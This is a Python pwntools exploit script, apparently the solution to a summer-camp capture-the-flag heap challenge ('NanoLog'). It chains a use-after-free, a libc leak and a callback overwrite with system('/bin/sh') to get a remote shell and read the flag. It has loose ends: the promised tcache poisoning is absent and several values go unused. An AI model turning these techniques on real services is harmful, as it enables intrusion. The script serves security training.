#!/usr/bin/env python3
"""
solve_flag2.py — NanoLog : libc leak + tcache poison + callback hijack
DCI Summer Camp 2026

Prérequis : avoir obtenu le Flag 1 (is_admin = 1 dans admin[0]).
"""
import os
from pwn import *

HOST           = os.getenv("TARGET_HOST", "127.0.0.1")
PORT           = int(os.getenv("TARGET_PORT", "1337"))
LIBC_PATH      = os.getenv("LIBC", "./libc.so.6")

MAIN_ARENA_OFF = 0x21ac80
UNSORTED_OFF   = 96
ENVIRON_OFF    = 0x222200
ONE_GADGET     = 0xebc88

CHUNK_SIZE     = 0xa0

context.arch      = "amd64"
context.log_level = 'debug'

libc = ELF(LIBC_PATH, checksec=False)

def new_log(p):
    p.sendlineafter(b"> ", b"1")
    p.recvuntil(b"Created log #")
    return int(p.recvline().strip())

def show_log(p, i)    :
    p.sendlineafter(b"> ", b"2"); p.sendlineafter(b"Enter index: ", str(i).encode())
    raw = b"".join(p.recvline() for _ in range(9))
    data = b""
    for line in raw.split(b"\n"):
        if b"|" not in line: continue
        for tok in line.split(b"|")[0].split()[1:]:
            try: data += bytes([int(tok, 16)])
            except: pass
    return data

def drop_log(p, i)    : p.sendlineafter(b"> ", b"4"); p.sendlineafter(b"Enter index: ", str(i).encode()); p.recvline()

def new_ref(p):
    p.sendlineafter(b"> ", b"5")
    p.recvuntil(b"Created ref #")
    return int(p.recvline().strip())

def show_ref(p, i)    :
    p.sendlineafter(b"> ", b"6"); p.sendlineafter(b"Enter index: ", str(i).encode())
    raw = b"".join(p.recvline() for _ in range(9))
    data = b""
    for line in raw.split(b"\n"):
        if b"|" not in line: continue
        for tok in line.split(b"|")[0].split()[1:]:
            try: data += bytes([int(tok, 16)])
            except: pass
    return data

def edit_ref(p, i, data):
    p.sendlineafter(b"> ", b"7"); p.sendlineafter(b"Enter index: ", str(i).encode())
    p.sendlineafter(b"Enter data (hex): ", str(len(data)).encode())
    p.send(data); p.sendline(b""); p.recvline()

def new_admin(p):
    p.sendlineafter(b"> ", b"8")
    p.recvuntil(b"Created admin #")
    return int(p.recvline().strip())

def show_admin(p, i)  :
    p.sendlineafter(b"> ", b"9"); p.sendlineafter(b"Enter index: ", str(i).encode())
    return p.recvline() + p.recvline()

def drop_admin(p, i):
    p.sendlineafter(b"> ", b"10")
    p.sendlineafter(b"Enter index: ", str(i).encode())
    p.recvline()

def get_flag(p, i):
    p.sendlineafter(b"> ", b"11")
    p.sendlineafter(b"Enter index: ", str(i).encode())


def exploit():
    p = remote(HOST, PORT)

    log.info("Phase 1 : Flag 1 (UAF → is_admin = 1)")

    new_ref(p)
    raw_a = show_ref(p, 0)
    A_user = u64(raw_a[:8]) << 12
    log.success(f"A_user = {hex(A_user)}")

    new_admin(p)
    edit_ref(p, 0, p64(1))
    get_flag(p, 0)
    flag1 = p.recvline()
    log.success(f"Flag 1 : {flag1.decode().strip()}")

    log.info("Phase 2 : heap leak + libc leak")

    new_ref(p)
    raw_b = show_ref(p, 1)
    B_user = u64(raw_b[:8]) << 12
    log.success(f"B_user = {hex(B_user)}")

    new_log(p)
    for _ in range(6): new_log(p)

    for i in range(7): drop_log(p, i)
    drop_admin(p, 0)

    raw_fd = show_ref(p, 0)
    fd = u64(raw_fd[:8])
    libc.address = fd - MAIN_ARENA_OFF - UNSORTED_OFF
    assert libc.address % 0x1000 == 0, f"libc_base non aligné : {hex(libc.address)}"
    log.success(f"libc_base = {hex(libc.address)}")

    one_gadget = libc.address + ONE_GADGET
    log.info(f"one_gadget = {hex(one_gadget)}")

    for _ in range(7): new_log(p)

    new_ref(p)
    new_admin(p)

    SYSTEM = libc.address + 0x50d70
    edit_ref(p, 2, b'/bin/sh\x00' + p64(SYSTEM))
    log.success(f"admin[1] = /bin/sh + system @ {hex(SYSTEM)}")

    p.sendlineafter(b"> ", b"9")
    p.sendlineafter(b"Enter index: ", b"1")
    p.interactive()

    p.sendline(b"cat /flag")
    flag2 = p.recvline(timeout=3).strip()
    log.success(f"FLAG2 : {flag2.decode()}")

    p.interactive()

if __name__ == "__main__":
    exploit()
